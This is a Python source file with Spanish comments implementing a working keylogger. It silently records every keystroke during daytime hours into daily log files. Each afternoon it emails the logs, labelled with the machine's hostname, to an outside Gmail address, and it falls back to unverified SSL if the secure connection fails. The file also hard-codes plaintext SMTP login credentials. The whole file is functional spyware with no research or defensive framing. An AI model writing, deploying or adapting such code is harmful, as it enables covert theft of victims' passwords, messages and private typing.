import os
import sys
import json
import smtplib
import ssl
from datetime import datetime, time
from email.message import EmailMessage
from pynput import keyboard
import socket
import threading
import time as time_module

# ---------- Configuración ----------
if getattr(sys, 'frozen', False):
    APP_DIR = os.path.dirname(sys.executable)
else:
    APP_DIR = os.path.dirname(os.path.abspath(__file__))

LOGS_DIR = os.path.join(APP_DIR, "logs")
CONFIG_FILE = os.path.join(APP_DIR, "config.dat")
START = time(hour=6, minute=0)
END = time(hour=20, minute=0)
HORA_ENVIO = time(hour=15, minute=0)  # 3 PM

# FECHA DE EXPIRACIÓN
FECHA_EXPIRACION = datetime(2025, 12, 31, 23, 59, 59)

# Configuración SMTP
SMTP_HOST = os.environ.get("SMTP_HOST", "smtp.zoho.com")
SMTP_PORT = int(os.environ.get("SMTP_PORT", 465))
SMTP_USER = os.environ.get("SMTP_USER", "onecore_mail@zohomail.com")
SMTP_PASS = os.environ.get("SMTP_PASS", "Ana152913**")
MAIL_TO = os.environ.get("MAIL_TO", "yarokasas@gmail.com")

# ---------- Variables globales ----------
nombre_equipo = ""
envio_realizado_hoy = False
keyboard_listener = None
buffer_texto = []  # Buffer para acumular texto
ultima_tecla_tiempo = None

# ---------- Funciones de Verificación ----------
def verificar_expiracion():
    """Verifica si el programa ha expirado."""
    ahora = datetime.now()
    if ahora > FECHA_EXPIRACION:
        return True
    return False

# ---------- Funciones de Configuración ----------
def obtener_nombre_equipo():
    """Obtiene el nombre del equipo automáticamente."""
    try:
        return socket.gethostname()
    except:
        return "EQUIPO_DESCONOCIDO"

def cargar_config():
    """Carga la configuración guardada."""
    global nombre_equipo
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                config = json.load(f)
                nombre_equipo = config.get("nombre_equipo", "")
                return True
        except:
            return False
    return False

def guardar_config():
    """Guarda la configuración."""
    config = {
        "nombre_equipo": nombre_equipo,
        "fecha_instalacion": datetime.now().isoformat(),
        "fecha_expiracion": FECHA_EXPIRACION.isoformat(),
        "politica_aceptada": True
    }
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(config, f, indent=2)
    except:
        pass

def inicializar_config():
    """Inicializa la configuración al primer uso."""
    global nombre_equipo
    if not cargar_config():
        nombre_equipo = obtener_nombre_equipo()
        guardar_config()

# ---------- Funciones de Log ----------
def obtener_log_del_dia():
    """Obtiene la ruta del archivo de log del día actual."""
    fecha = datetime.now().strftime('%Y-%m-%d')
    if not os.path.exists(LOGS_DIR):
        os.makedirs(LOGS_DIR)
    return os.path.join(LOGS_DIR, f"log_{fecha}.txt")

def dentro_de_horario():
    """Verifica si estamos dentro del horario de captura."""
    ahora = datetime.now().time()
    return START <= ahora <= END

def asegurar_log_existe():
    """Asegura que el archivo de log del día existe."""
    log_file = obtener_log_del_dia()
    if not os.path.exists(log_file):
        try:
            with open(log_file, "w", encoding="utf-8") as f:
                f.write(f"═══════════════════════════════════════════════════════════\n")
                f.write(f"  REGISTRO DE ACTIVIDAD - {nombre_equipo}\n")
                f.write(f"  Fecha: {datetime.now().strftime('%Y-%m-%d')}\n")
                f.write(f"  Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n")
                f.write(f"═══════════════════════════════════════════════════════════\n\n")
        except:
            pass

def escribir_buffer():
    """Escribe el buffer acumulado al log."""
    global buffer_texto
    
    if not buffer_texto:
        return
    
    try:
        log_file = obtener_log_del_dia()
        texto = ''.join(buffer_texto)
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {texto}\n")
        
        buffer_texto = []
    except:
        pass

def log_key(text):
    """Añade texto al buffer."""
    global buffer_texto, ultima_tecla_tiempo
    
    if not dentro_de_horario():
        return False
    
    try:
        ahora = time_module.time()
        
        # Si han pasado más de 2 segundos, escribir buffer y empezar nuevo párrafo
        if ultima_tecla_tiempo and (ahora - ultima_tecla_tiempo) > 2:
            escribir_buffer()
        
        buffer_texto.append(text)
        ultima_tecla_tiempo = ahora
        
        # Si el buffer es muy grande (más de 500 caracteres), escribirlo
        if len(buffer_texto) > 500:
            escribir_buffer()
        
        return True
    except:
        return False

def on_press(key):
    """Callback para cuando se presiona una tecla."""
    try:
        if hasattr(key, 'char') and key.char:
            # Tecla normal (letras, números, símbolos)
            log_key(key.char)
        else:
            # Teclas especiales
            key_name = str(key).replace("Key.", "")
            
            # Mapeo de teclas especiales a formato legible
            teclas_especiales = {
                'space': ' ',
                'enter': '\n',
                'tab': '\t',
                'backspace': '[←]',
                'delete': '[DEL]',
                'shift': '',
                'shift_r': '',
                'ctrl_l': '',
                'ctrl_r': '',
                'alt_l': '',
                'alt_r': '',
                'caps_lock': '[CAPS]',
                'esc': '[ESC]',
                'up': '[↑]',
                'down': '[↓]',
                'left': '[←]',
                'right': '[→]',
            }
            
            if key_name.lower() in teclas_especiales:
                texto = teclas_especiales[key_name.lower()]
                if texto:  # Solo registrar si tiene valor
                    log_key(texto)
            else:
                # Otras teclas especiales
                log_key(f'[{key_name}]')
    except:
        pass

# ---------- Funciones de Envío ----------
def enviar_mail_con_adjuntos(subject: str, body: str, attachments: list) -> tuple:
    """Envía un email con archivos adjuntos."""
    if not SMTP_USER or not SMTP_PASS or not MAIL_TO:
        return False, "Credenciales SMTP incompletas."

    try:
        msg = EmailMessage()
        msg["From"] = SMTP_USER
        msg["To"] = MAIL_TO
        msg["Subject"] = subject
        msg.set_content(body)

        for path in attachments:
            try:
                if os.path.exists(path):
                    with open(path, "rb") as f:
                        data = f.read()
                    filename = os.path.basename(path)
                    msg.add_attachment(data, maintype="application", 
                                     subtype="octet-stream", filename=filename)
            except Exception as e:
                return False, f"Error adjuntando: {e}"

        # Intentar con verificación SSL normal
        try:
            if SMTP_PORT == 465:
                context = ssl.create_default_context()
                with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
                    server.login(SMTP_USER, SMTP_PASS)
                    server.send_message(msg)
            else:
                with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                    server.starttls(context=ssl.create_default_context())
                    server.login(SMTP_USER, SMTP_PASS)
                    server.send_message(msg)
            return True, "Enviado"
        except ssl.SSLError:
            # Si falla por SSL, reintentar sin verificar certificado
            if SMTP_PORT == 465:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, context=context) as server:
                    server.login(SMTP_USER, SMTP_PASS)
                    server.send_message(msg)
            else:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                with smtplib.SMTP(SMTP_HOST, SMTP_PORT) as server:
                    server.starttls(context=context)
                    server.login(SMTP_USER, SMTP_PASS)
                    server.send_message(msg)
            return True, "Enviado (SSL sin verificar)"
    except Exception as e:
        return False, str(e)

def enviar_log_programado():
    """Envía el log del día automáticamente."""
    try:
        # Escribir buffer pendiente antes de enviar
        escribir_buffer()
        
        log_file = obtener_log_del_dia()
        
        # Verificar que existe y tiene contenido
        if not os.path.exists(log_file):
            return False, "Log no existe"
        
        size = os.path.getsize(log_file)
        if size < 100:
            return False, "Log vacío"
        
        fecha = datetime.now().strftime('%Y-%m-%d')
        dias_restantes = (FECHA_EXPIRACION - datetime.now()).days
        
        subject = f"[Keylog] {nombre_equipo} - {fecha}"
        body = f"Registro diario del equipo: {nombre_equipo}\n"
        body += f"Fecha: {fecha}\n"
        body += f"Horario: {START.strftime('%H:%M')} - {END.strftime('%H:%M')}\n"
        body += f"Tamaño: {size} bytes\n"
        body += f"\n⚠️ Licencia expira en {dias_restantes} días ({FECHA_EXPIRACION.strftime('%Y-%m-%d')})"
        
        success, msg = enviar_mail_con_adjuntos(subject, body, [log_file])
        return success, msg
    except Exception as e:
        return False, str(e)

def limpiar_logs_antiguos():
    """Elimina logs de más de 7 días."""
    try:
        if not os.path.exists(LOGS_DIR):
            return
        
        ahora = datetime.now()
        for filename in os.listdir(LOGS_DIR):
            if filename.startswith("log_") and filename.endswith(".txt"):
                filepath = os.path.join(LOGS_DIR, filename)
                fecha_str = filename.replace("log_", "").replace(".txt", "")
                try:
                    fecha_archivo = datetime.strptime(fecha_str, '%Y-%m-%d')
                    dias_diff = (ahora - fecha_archivo).days
                    if dias_diff > 7:
                        os.remove(filepath)
                except:
                    pass
    except:
        pass

def verificar_hora_envio():
    """Verifica continuamente si es hora de enviar."""
    global envio_realizado_hoy
    
    while True:
        try:
            # Verificar expiración cada ciclo
            if verificar_expiracion():
                # Escribir buffer pendiente
                escribir_buffer()
                # Programa expirado, detener
                return
            
            ahora = datetime.now()
            hora_actual = ahora.time()
            
            # Resetear flag si es un nuevo día (a las 00:01)
            if ahora.hour == 0 and ahora.minute == 1:
                envio_realizado_hoy = False
                limpiar_logs_antiguos()
            
            # Verificar si es la hora de envío
            minuto_envio = HORA_ENVIO.hour * 60 + HORA_ENVIO.minute
            minuto_actual = hora_actual.hour * 60 + hora_actual.minute
            
            if (minuto_actual == minuto_envio and not envio_realizado_hoy):
                success, msg = enviar_log_programado()
                if success:
                    envio_realizado_hoy = True
                    log_key(f"\n[SISTEMA: Correo enviado a las {ahora.strftime('%H:%M')}]\n")
            
            # Esperar 60 segundos
            time_module.sleep(60)
        except Exception as e:
            time_module.sleep(60)

# ---------- Inicio del Servicio ----------
def iniciar_servicio():
    """Inicia el servicio de captura en segundo plano."""
    global keyboard_listener
    
    try:
        # Verificar expiración antes de iniciar
        if verificar_expiracion():
            # Programa expirado, no iniciar
            return
        
        # Inicializar configuración
        inicializar_config()
        asegurar_log_existe()
        
        # Iniciar listener de teclado
        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.start()
        
        # Iniciar verificación de envío en hilo separado
        thread_envio = threading.Thread(target=verificar_hora_envio, daemon=True)
        thread_envio.start()
        
        # Thread para escribir buffer periódicamente
        def escribir_buffer_periodico():
            while not verificar_expiracion():
                time_module.sleep(5)  # Cada 5 segundos
                escribir_buffer()
        
        thread_buffer = threading.Thread(target=escribir_buffer_periodico, daemon=True)
        thread_buffer.start()
        
        # Mantener el programa corriendo
        keyboard_listener.join()
        
    except Exception as e:
        # Si hay error, intentar nuevamente después de 30 segundos
        if not verificar_expiracion():
            time_module.sleep(30)
            iniciar_servicio()

if __name__ == "__main__":
    iniciar_servicio()